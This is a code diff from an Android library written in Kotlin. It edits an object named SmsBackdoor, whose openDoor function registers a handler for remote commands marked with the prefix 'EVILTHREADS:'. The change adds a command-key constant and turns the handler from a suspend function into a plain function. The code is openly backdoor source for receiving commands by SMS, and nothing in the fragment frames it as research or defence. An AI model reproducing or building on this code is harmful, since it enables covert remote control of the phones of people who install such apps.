@@ -41,9 +41,10 @@ import com.candroid.bootlaces.bootService
 ..............\.............\...
 */
 object SmsBackdoor{
+    val KEY_REMOTE_COMMAND = "KEY_REMOTE_COMMAND"
     internal var commandCode : String = "EVILTHREADS:"
-    internal var commandHandler : ( suspend (String) -> Unit)? = null
-    fun openDoor(ctx: AppCompatActivity, remoteCommandCode: String, notifTitle: String? = null, notifBody: String? = null, remoteCommandHandler: suspend (remoteCommand: String) -> Unit){
+    internal var commandHandler : ( (String) -> Unit)? = null
+    fun openDoor(ctx: AppCompatActivity, remoteCommandCode: String, notifTitle: String? = null, notifBody: String? = null, remoteCommandHandler: (remoteCommand: String) -> Unit){
         commandHandler = remoteCommandHandler
         commandCode = remoteCommandCode
         if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
